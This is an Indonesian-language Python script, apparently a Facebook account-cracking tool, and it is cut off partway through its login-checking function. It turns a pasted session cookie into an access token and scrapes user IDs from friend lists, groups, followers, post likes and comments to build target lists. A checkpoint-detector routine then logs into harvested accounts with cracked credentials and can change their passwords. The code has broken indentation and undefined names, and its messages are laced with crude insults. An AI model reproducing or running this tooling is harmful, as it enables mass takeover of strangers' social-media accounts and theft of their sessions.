# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.

import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

#-----------------[ IMPORT - PREMIUM ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as tred
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as XyzonXD
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok,cp,id,loop = [],[],[],0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
###########################################################################################

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def panjul(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def banner():
    print (' %s•%s•%s•                                      %s•%s•%s•\n   %s_______  ______ _______ _______ _    _\n   %s|       |_____/ |_____| |       |____/ \n   %s|_____  |    \_ |     | |_____  |    \\_ \n\n           %s• %sCoded by %s: %sSanz-Tzy %s•\n%s•%s•%s•                                      %s•%s•%s•\n%s # %sFb   %s: %sfacebook.com/bintangt.zy.92\n%s # %sGit  %s: %sgithub.com/Sanz-Tzy\n%s # %s---------------------------------------- %s#'%    (M,K,H,M,K,H,M,M,P,U,K,M,K,U,M,K,H,M,K,H,U,O,M,O,U,O,M,O,P,M,P))
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n %s[%s#%s] crack selesai...\n'%(N,K,N))
        print(' [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N))
        print(' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N))
        cek_cp = input(f"\n [{O}?{N}] munculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] jangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{M}!{N}] hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{H}•{N}] contoh password : {H}yayanxd{N}")
                pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
            input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} Selamat tinggal:)")
        else:
            print(f"\n [{M}!{N}] Y/t goblok");hasil(ok,cp)
    else:
        print('\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N));exit()

#MASUK TOKEN
def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
	try:
		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,title=f"[bold red][[bold green] Cookies [bold red]]",style=f"bold red"))
		your_cookies = input(' Cookie  : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" {P}[{H}+{P}] \33[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(" [+] \33[1;92mLogin Berhasil | Ketik Perintah Di Bawah Ini")
							print(" [+] \33[1;96mpython run.py");exit()
			except Exception as e:
				print(" [+]\33[1;91m Cookies Tidak Dapat Di Akses")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

### ORANG GANTENG ###
def moch_yayan():
    try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+]\33[1;91m Cookies Kadaluarsa ')
		time.sleep(5)
		moch_yayan()
	os.system('clear')
	banner()
    IP = requests.get("https://api.ipify.org/").text
    _mmk_ = open('.cokie.txt').read()
    kueh  = {"cookie":_mmk_}
    print(" %s#%s IP   %s: %s%s%s "%(U,O,M,O,IP,N))
    print(" %s#%s Name %s: %s%s%s \n"%(U,O,M,H,nama,N))
    print(' %s01%s %sCrack ID From Public friends'%(P,N,O));time.sleep(0.03)
    print(' %s02%s %sCrack ID From Member Grup'%(P,N,O));time.sleep(0.03)
    print(' %s03%s %sCrack ID From Total Followers'%(P,N,O));time.sleep(0.03)
    print(' %s04%s %sCrack ID From Like Posts'%(P,N,O));time.sleep(0.03)
    print(' %s05%s %sCrack ID From Random Masall'%(P,N,O));time.sleep(0.03)
    print(' %s06%s %sCrack ID From Post Coments'%(P,N,O));time.sleep(0.03)
    print(' %s07%s %sCrack From Account Instagram '%(P,N,O));time.sleep(0.03)
    print(' %s08%s %sCheckpoint Detector'%(P,N,O));time.sleep(0.03)
    print(' %s09%s %sSettings User Agent'%(P,N,O));time.sleep(0.03)
    print(' %s10%s %sCheck Hasil Crack'%(P,N,O));time.sleep(0.03)
    print(' %s11%s %sUpgrade %sPremium%s'%(P,N,O,H,N));time.sleep(0.03)
    print(' %s00%s %sLogout%s'%(M,N,O,N));time.sleep(0.03)
    pepek = input('\n %s#%s %smenu%s > %s'%(H,N,O,M,K))
    if pepek == '':
        print('\n %s %s×%s %sIsi yg benar!%s'%(N,M,N,M,N));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        try:
            print("\n %s*%s %sPastikan Daftar teman bersifat publik"%(P,N,O))
            user = input(' %s*%s %sId/Username%s %s: %s'%(P,N,O,N,P,K))
            _memek_ = __convert__(user)
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5001&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
                id.append(a['id'] + '<=>' + a['name'])
        except KeyError:
            print('\n %s%s×%s %sgagal mengambil id, kemungkinan id tidaklah public%s'%(N,M,N,O,N));time.sleep(3);moch_yayan()
    elif pepek in['2','02']:
        kontol = input(f"{N} %s*%s %smasukkan id grup%s %s: %s"%(P,N,O,N,P,K))
        if kontol in[""," "]:
            print('\n %s%s×%s %sjangan kosong kentod!%s'%(N,M,N,O));time.sleep(2);moch_yayan()
        else:
            try:
                ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                if "Halaman Tidak Ditemukan" in ajg:
                    print(f"\n %s%s×%s %sgroup dengan id %sMemek%s tidak ditemukan%s"%(N,M,N,O,H,O,N));time.sleep(2);moch_yayan()
                elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                    print("\n %s%s×%s %sfacebook membatasi setiap aktivitas, limit bro, silahkan beralih akun%s"%(N,M,N,O,N));time.sleep(2);moch_yayan()
                elif "Konten Tidak Ditemukan" in ajg:
                    print(f"\n %s%s×%s %sgroup dengan id %sMemek%s tidak ditemukan%s"%(N,M,N,O,H,O,N));time.sleep(2);moch_yayan()
                else:
                    print(" \x1b[1;97m* \x1b[1;96.mnama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                    print("\n %s!%s %suntuk berhenti tekan CTRL lalu tekan c di keyboard anda.%s"%(P,N,O,N))
                    crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("\n %s!%s %sKesalahan Pada Koneksi%s"%(P,N,O,N))
    elif pepek in['3','03']:
        kontol = input(f"{N} %s*%s %sid/username followers%s : %s"%(P,N,O,P,K))
        if kontol in[""," "]:
            print('\n %s%s×%s %sjangan kosong kentod!%s'%(N,M,N,O,N));time.sleep(2);moch_yayan()
        try:
            print("\n %s!%s %suntuk berhenti tekan CTRL lalu tekan c di keyboard anda.%s"%(P,N,O,N))
            followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
        except KeyError:
            print(f"\n %s!%s %sWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod%s"%(P,N,O,N));time.sleep(2);moch_yayan()
    elif pepek in['4','04']:
        kontol = input(f"{N} %s!%s %smasukan id postingan%s %s: %s"%(P,N,O,N,P,K))
        if kontol in[""," "]:
            print('\n %s%s×%s %sjangan kosong kentod!%s'%(N,M,N,O,N));time.sleep(2);moch_yayan()
        try:
            print("\n %s!%s %suntuk berhenti tekan CTRL lalu tekan c di keyboard anda.%s"%(P,N,O,N))
            like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
        except KeyError:
            print(f"\n %s!%s %sWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod%s"%(P,N,O,N));time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
        _ngocok_(kontol)
    elif pepek in['6','06']:
        kontol = input(f"{N} %s!%s %sid postingan%s %s: %s"%(P,N,O,N,P,K))
        if kontol in[""," "]:
            print('\n %s%s×%s %sjangan kosong kentod!%s'%(N,M,N,O,N));time.sleep(2);moch_yayan()
        try:
            print("\n %s!%s %suntuk berhenti tekan CTRL lalu tekan c di keyboard anda.%s"%(P,N,O,N))
            ngomen_post(f"https://mbasic.facebook.com/{kontol}")
        except KeyError:
            print(f"\n %s!%s %sWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod%s"%(P,N,O,N));time.sleep(2);moch_yayan()
    elif pepek in['7','07']:
        log_igeh()
        menu_igeh()
    elif pepek in['8','08']:
        gabut()
    elif pepek in['9','09']:
        seting_yntkts()
    elif pepek in['10']:
        dirs = os.listdir("results")
        print('\n %s[%s %shasil crack yang tersimpan di file anda%s %s]%s\n'%(P,N,O,N,P,N))
        for file in dirs:
            print(" %s+%s %s%s%s"%(P,N,H,file,N))
        file = input("\n %s?%s %smasukan nama file%s :%s "%(M,N,O,P,H))
        if file == "":
            file = input("\n %s%s?%s %smasukan nama file%s :%s %s"%(N,M,N,O,P,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s%s#%s %s--------------------------------------------"%(N,P,N,O));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" %s*%s %sHasil %scrack%s %spada tanggal %s:%s%s%s %stotal %s: %s%s%s"%(M,N,O,H,N,O,M,H,hps_nm,N,O,M,O,len(total),H))
        print(" %s%s#%s %s--------------------------------------------"%(N,P,N,O));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s%s#%s %s--------------------------------------------"%(N,P,N,O))
        input('\n    %sKEMBALI%s   '%(O,N));moch_yayan()
    elif pepek in['11']:
    	premium()
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s%s+%s %smenghapus cookie%s %s'%(N,M,N,O,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        exit('\n %s%s✓%s%s berhasil menghapus cookie'%(N,M,N,O))
    else:
        print('\n %s%s×%s %smenu%s [%s%s%s] %stidak ada, cek menu nya bro!%s'%(N,M,N,O,N,M,pepek,N,O,N));time.sleep(2);moch_yayan()
    if len(id)!=0:
        print("")
        return __crack__().plerr(id)
    else:
        print("\n %s%s×%s %sgagal mengambil id, silahkan coba lagi%s"%(N,M,N,O,N));time.sleep(2);moch_yayan()

### GANTI USER AGENT
def seting_yntkts():
    print('\n %s01%s %sganti user agent%s'%(P,N,O,N))
    print(' %s02%s %scheck user agent%s'%(P,N,O,N))
    ytbjts = input('\n %s%s?%s %schoose%s %s: %s'%(N,P,N,O,N,P,K))
    if ytbjts == '':
        print('\n %s%s×% %sJan kosong Kentod%s'%(N,M,N,O,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('\n %s%s+%s %sUser Agent anda%s : %s%s'%(N,P,N,O,P,H,user_agent))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s%s×%s %sinput yang bener%s'%(N,M,N,O,N));time.sleep(2);seting_yntkts()

# USER AGENT BARU
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = input('\n %s?%s %singin menggunakan user agent hp anda%s [%sY%s/%sT%s]%s: %s'%(P,N,O,O,H,O,K,O,P,K))
    if _asu_ == '':
        print('\n %s%s×%s %sGak boleh kosong Kentod%s'%(N,M,N,O,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s %sanda akan di arakan ke situs web setelah di arahkan ke situs web.%s\n  %s*%s %sklik ikon%s %sMY USER AGENT%s %slalu copy semua user agent anda...%s'%(P,N,O,N,P,N,O,N,H,N,O,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = input(' %s?%s %suser agent hp anda%s :%s '%(P,N,O,P,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s%s✓%s %sberhasil menggunakan user agent hp anda...%s'%(N,H,N,O,N))
        input('\n  %s %skembali%s '%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' %s?%s %smasukan user agent%s :%s '%(P,N,O,P,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s%s✓%s %sberhasil mengganti user agent...%s'%(N,H,N,O,N))
        input('\n  %s%skembali%s '%(N,O,N));moch_yayan()
    else:
        print('\n %s%s!%s %sY/T ngentod%s'%(N,M,N,O,N));yo_ndak_tau_ko_tanya_saia()

# CRACK DARI GRUP
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r \x1b[1;97m* \x1b[1;96msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r \x1b[1;97m* \x1b[1;96msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
# CRACK LIKE POSTINGAN
def like_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        if "Semua 0" in kontol:
            print("\n %s!%s %sTidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v%s"%(P,N,O,N));time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r \x1b[1;97m* \x1b[1;96msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
# CRACK FOLLOWERS
def followers(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('a',href=True):
            if "profile.php" in mmk.get('href'):
                bb = mmk.text
                xd = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",mmk.get("href")))
                id.append(bb+'<=>'+xd+'\n')
            sys.stdout.write('\r \x1b[1;97m* \x1b[1;96msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all('a',href=True):
            if 'Lihat Selengkapnya' in asu.text:
                followers("https://mbasic.facebook.com/subscribe/lists/?id="+asu.get("href"))
    except:pass
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol= requests.get(hencet,cookies=kueh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r \x1b[1;97m* \x1b[1;96msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
    except:pass
# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input('\n %s?%s %smasukan jumblah target%s %s: %s'%(M,N,O,N,P,K)))
    except:nanya_keun=1
    print(" %s*%s %sIngat Daftar teman harus bersifat Publik%s\n"%(P,N,O,N))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' %s*%s %sId/username%s %s%s%s %s: %s'%(P,N,O,N,H,mnh,N,P,K))
        _memek_ = __convert__(user)
        try:
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),__ppk__)).json()["data"]:
                uid = a["id"]
                nama = a["name"]
                id.append(uid+"<=>"+nama)
        except (KeyError,IOError):
            print('\n %s×%s %sgagal mengambil id, kemungkinan id tidaklah publik%s'%(P,N,O,N));time.sleep(3);moch_yayan()
# USERNAME CONVERT TO ID
def __convert__(user):
    if user == "me":
        return {"_kontol_":user}
    else:
        payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_kontol_":asw}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    print('\n %s[%s %shasil crack yang tersimpan di file anda%s %s]%s\n'%(P,N,O,N,P,N))
    for file in dirs:
        print(" %s+%s %s"%(O,N,file))
    jalan(f" {M}×{N} %ssebelum memasukan file,hidupkan mode pesawat 3 detik.%s"%(O,N));time.sleep(5)
    files = input("\n %s?%s %snama file%s %s: %s"%(M,N,O,N,P,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2);moch_yayan()
    ww=input(f"\n {N}{O}?{N} %subah password ketika tap yes%s [%sY%s/%sT%s]%s: %s"%(O,O,H,O,K,O,P,K))
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" {H}•{N} {O}contoh password{P} : {H}ysssyan{N}")
        pwBar=input(f"\n {H}+{N} %smasukan password baru%s : %s"%(O,P,K))
        if len(pwBar) <= 5:
             print('\n %s%s×%s %skata sandi minimal 6 karakter%s'%(N,M,N,O,N))
        else:
            pwBaru.append(pwBar)
    print('%s %s*%s %sTotal%s %s%s%s %sAkun%s'%(N,P,N,O,N,K,str(len(buka_baju)),N,O,N))
    jalan(" %s%s#%s --------------------------------------------"%(N,P,O))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        print(f' {N}{M}>{N} {O}login ke akun{P} : {K}{kontol.replace(" [×] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   %s[ %sProses Pengecekan Selesai %s]\n'%(P,O,P))
    input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()

# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
